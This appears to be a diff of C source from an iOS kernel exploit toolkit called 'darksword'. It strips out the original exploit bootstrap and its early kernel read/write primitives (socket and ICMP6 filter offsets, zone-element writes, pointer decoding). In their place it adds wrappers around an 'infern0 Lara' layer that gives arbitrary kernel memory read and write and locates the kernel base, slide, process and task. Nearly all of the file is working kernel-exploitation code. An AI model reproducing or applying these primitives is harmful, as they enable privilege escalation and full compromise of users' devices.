@@ -10,6 +10,7 @@
 #include "utils.h"
 #include "xpaci.h"
 #include "offsets.h"
+#include "../../kexploit/lara_compat.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -1370,117 +1371,98 @@ static int pe(void) {
 }
 
 int ds_run(void) {
-    g_ds_ready = false;
-    ds_progresssafe(0.0);
-    random_marker = ((uint64_t)arc4random() << 32) | arc4random();
-    wired_page_marker = ((uint64_t)arc4random() << 32) | arc4random();
-    target_file_size = PAGE_SZ * 2;
-
-    default_file_content = calloc(1, target_file_size);
-    for (uint64_t i = 0; i < target_file_size; i += 8)
-        *(uint64_t *)(default_file_content + i) = random_marker;
-
-    pe_log("starting darksword");
-    pe_log("offsets: inpcb.icmp6filt=0x%x socket.usecount=0x%x socket.proto=0x%x protosw.input=0x%x",
-           off_inpcb_inp_depend6_inp6_icmp6filt,
-           off_socket_so_usecount,
-           off_socket_so_proto,
-           off_protosw_pr_input);
-    int result = pe();
-    if (result != 0) {
-        ds_progresssafe(0.99);
+    g_ds_ready = infern0_lara_krw_ready();
+    if (g_ds_ready) {
+        pe_log("reusing infern0 kernel session");
+        ds_progresssafe(1.0);
+        return 0;
     }
 
-    free(default_file_content);
-    default_file_content = NULL;
+    ds_progresssafe(0.0);
+    pe_log("starting infern0 kernel session (Lara exploit disabled)");
+    ds_progresssafe(0.10);
+    int result = infern0_lara_krw_acquire();
+    g_ds_ready = result == 0 && infern0_lara_krw_ready();
+    if (g_ds_ready) {
+        kernel_base = infern0_lara_kernel_base();
+        kernel_slide = infern0_lara_kernel_slide();
+        our_proc = infern0_lara_our_proc();
+        our_task = infern0_lara_our_task();
+        pe_log("infern0 kernel session ready: base=0x%llx proc=0x%llx task=0x%llx",
+               kernel_base, our_proc, our_task);
+        ds_progresssafe(1.0);
+        return 0;
+    }
+    pe_log("infern0 kernel session failed safely (result=%d)", result);
+    ds_progresssafe(0.99);
     return result;
 }
 
 bool ds_is_ready(void) {
+    g_ds_ready = infern0_lara_krw_ready();
     return g_ds_ready;
 }
 
 uint64_t ds_get_kernel_base(void) {
-    return kernel_base;
+    return infern0_lara_kernel_base();
 }
 
 uint64_t ds_get_kernel_slide(void) {
-    return kernel_slide;
+    return infern0_lara_kernel_slide();
 }
 
 uint64_t ds_kread64(uint64_t address) {
-    return early_kread64(address);
+    return infern0_lara_kread64(address);
 }
 
 uint32_t ds_kread32(uint64_t address) {
-    uint32_t value = 0;
-    early_kread(address, &value, 4);
-    return value;
+    return infern0_lara_kread32(address);
 }
 
 uint16_t ds_kread16(uint64_t addr) {
-    uint16_t val = 0;
-    early_kread(addr, &val, sizeof(val));
-    return val;
+    return infern0_lara_kread16(addr);
 }
 
 uint8_t ds_kread8(uint64_t addr) {
-    uint32_t low = ds_kread32(addr);
-    return (uint8_t)(low & 0xFF);
+    return infern0_lara_kread8(addr);
 }
 
 void ds_kwrite64(uint64_t address, uint64_t value) {
-    early_kwrite64(address, value);
+    if (!infern0_lara_kwrite64(address, value))
+        pe_log("verified write64 rejected at 0x%llx", address);
 }
 
 void ds_kwrite32(uint64_t address, uint32_t value) {
-    uint8_t buf[EARLY_KRW_LENGTH];
-    early_kread(address, buf, EARLY_KRW_LENGTH);
-    *(uint32_t *)buf = value;
-    early_kwrite32bytes(address, buf);
+    if (!infern0_lara_kwrite32(address, value))
+        pe_log("verified write32 rejected at 0x%llx", address);
 }
 
 void ds_kwrite16(uint64_t addr, uint16_t val) {
-    uint8_t tmp[EARLY_KRW_LENGTH];
-    early_kread(addr, tmp, EARLY_KRW_LENGTH);
-    *(uint16_t *)tmp = val;
-    early_kwrite32bytes(addr, tmp);
+    if (!infern0_lara_kwrite16(addr, val))
+        pe_log("verified write16 rejected at 0x%llx", addr);
 }
 
 void ds_kwrite8(uint64_t what, uint8_t val) {
-    uint64_t addr = early_kread64(what);
-    early_kwrite64(what, (addr & 0xFFFFFFFFFFFFFF00ULL) | (uint64_t)val);
+    if (!infern0_lara_kwrite8(what, val))
+        pe_log("verified write8 rejected at 0x%llx", what);
 }
 
 void ds_kread(uint64_t address, void *buffer, uint64_t size) {
-    kread_length(address, buffer, size);
+    infern0_lara_kreadbuf(address, buffer, size);
 }
 
 void ds_kwrite(uint64_t address, void *buffer, uint64_t size) {
-    kwrite_length(address, buffer, size);
+    if (!infern0_lara_kwritebuf(address, buffer, size))
+        pe_log("verified buffer write rejected at 0x%llx (%llu bytes)", address, size);
 }
 
 void ds_kreadbuf(uint64_t addr, void *buf, uint64_t len) {
-    for (size_t off = 0; off < len; off += 8) {
-        uint64_t val = early_kread64(addr + off);
-        size_t chunk = (len - off >= 8) ? 8 : (len - off);
-        memcpy((uint8_t *)buf + off, &val, chunk);
-    }
+    infern0_lara_kreadbuf(addr, buf, len);
 }
 
 void ds_kwritebuf(uint64_t addr, const void *buf, uint64_t len) {
-    for (size_t off = 0; off < len; off += 8) {
-        uint64_t val = 0;
-        size_t chunk = (len - off >= 8) ? 8 : (len - off);
-        memcpy(&val, (const uint8_t *)buf + off, chunk);
-        if (chunk == 8) {
-            early_kwrite64(addr + off, val);
-        } else {
-            uint64_t original = early_kread64(addr + off);
-            uint64_t mask = (1ULL << (chunk * 8)) - 1;
-            early_kwrite64(addr + off, (original & ~mask) | (val & mask));
-        }
-    }
+    if (!infern0_lara_kwritebuf(addr, buf, len))
+        pe_log("verified buffer write rejected at 0x%llx (%llu bytes)", addr, len);
 }
 
 void ds_khexdump(uint64_t addr, size_t size) {
@@ -1529,93 +1511,38 @@ void ds_khexdump(uint64_t addr, size_t size) {
 }
 
 uint64_t ds_kreadptr(uint64_t va) {
-    return xpaci(ds_kread64(va));
+    return infern0_lara_kreadptr(va);
 }
 
 uint64_t ds_kreadsmrptr(uint64_t va) {
-    uint64_t value = ds_kreadptr(va);
-    uint64_t bits = (smr_base << (62-t1sz_boot));
-    
-    if((value & bits) == 0) {
-        return ((value & (0xFFFFFFFFFFFFC000 & ~bits)) | bits);
-    }
-    return (value & 0xFFFFFFFFFFFFFFE0);
+    return infern0_lara_kreadsmrptr(va);
 }
 
 void ds_kwritezoneelement(uint64_t dst, const void *src, uint64_t len) {
-    if (len < EARLY_KRW_LENGTH) {
-        printf("ds_kwritezoneelement: len < 0x20 not supported\n");
-        return;
-    }
-
-    uint8_t tmpBuf[EARLY_KRW_LENGTH];
-    uint64_t remaining = len;
-    uint64_t offset = 0;
-
-    while (remaining != 0) {
-        uint64_t writeSize = (remaining >= EARLY_KRW_LENGTH)
-                             ? EARLY_KRW_LENGTH
-                             : (remaining % EARLY_KRW_LENGTH);
-
-        uint64_t writeDst = dst + offset;
-        uint64_t srcOff   = offset;
-
-        if (writeSize != EARLY_KRW_LENGTH) {
-            uint64_t adjust = EARLY_KRW_LENGTH - writeSize;
-            writeDst -= adjust;
-            srcOff   -= adjust;
-
-            ds_kreadbuf(writeDst, tmpBuf, EARLY_KRW_LENGTH);
-            memcpy(tmpBuf + adjust, (const uint8_t *)src + offset, writeSize);
-            early_kwrite32bytes(writeDst, tmpBuf);
-        } else {
-            early_kwrite32bytes(writeDst, (void *)((const uint8_t *)src + srcOff));
-        }
-
-        remaining -= writeSize;
-        offset    += writeSize;
-    }
+    if (!infern0_lara_kwritezone(dst, src, len))
+        pe_log("verified zone write rejected at 0x%llx (%llu bytes)", dst, len);
 }
 
 uint64_t ds_kallocarrdec(uint64_t ptr) {
-    uint64_t shift = 64 - t1sz_boot - 1;
-    uint64_t zone_mask = 1ULL << shift;
-
-    if (ptr & zone_mask) {
-        ptr &= ~0x1FULL;
-    } else {
-        ptr &= ~0x3FFFULL;
-        ptr |= zone_mask;
-    }
-    return ptr;
+    return infern0_lara_kalloc_array_decode(ptr);
 }
 
 uint64_t ds_get_pcbinfo(void) {
-    return early_kread64(control_socket_pcb + off_inpcb_inp_pcbinfo);
+    return infern0_lara_pcbinfo();
 }
 
 uint64_t ds_get_rw_socket_pcb(void) {
-    return rw_socket_pcb;
+    return infern0_lara_rw_socket_pcb();
 }
 
 uint64_t ds_get_our_proc(void) {
-    return our_proc;
+    return infern0_lara_our_proc();
 }
 
 uint64_t ds_get_our_task(void) {
-    return our_task;
+    return infern0_lara_our_task();
 }
 
 bool ds_isvalid(uint64_t value) {
-    if (!value) {
-        return false;
-    }
-
-    uint16_t top_bits = (value >> 48) & 0xFFFF;
-
-    if (top_bits == 0xFFFF || top_bits == 0xFFFE) {
-        return true;
-    }
-
-    return false;
+    return infern0_lara_is_kernel_address(value);
 }
